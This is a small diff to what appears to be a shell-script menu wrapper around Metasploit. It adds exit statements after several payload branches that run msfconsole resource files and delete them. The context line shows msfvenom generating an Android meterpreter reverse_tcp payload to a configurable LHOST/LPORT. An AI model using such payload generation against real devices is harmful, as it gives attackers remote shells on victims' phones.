@@ -80,6 +80,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/$n
     msfconsole -r .configsploit.rc
     sleep 1
     rm -rf .configsploit
+    exit
 fi
 if [ "$payload" = "2" ];then
 clear
@@ -108,6 +109,7 @@ echo
    msfconsole -r .metaconftmp.rc
    sleep 1
    rm -rf .metaconftmp.rc
+   exit
 fi
 if [ "$payload" = "3" ];then
 clear
@@ -134,6 +136,7 @@ echo
    msfconsole -r .metaconftmp.rc
    sleep 1
    rm -rf .metaconftmp.rc
+   exit
 fi
 if [ "$payload" = "4" ];then
 clear
@@ -161,6 +164,7 @@ echo
    msfconsole -r .metaconftmp.rc
    sleep 1
    rm -rf .metaconftmp.rc
+   exit
 fi
 if [ "$payload" = "5" ];then
 clear
@@ -405,7 +409,7 @@ echo
    msfconsole -r .configsploit.rc
    sleep 1
    rm -rf .configsploit.rc
-exit
+   exit
 fi
 if [ "$sys" = "3" ];then
 clear
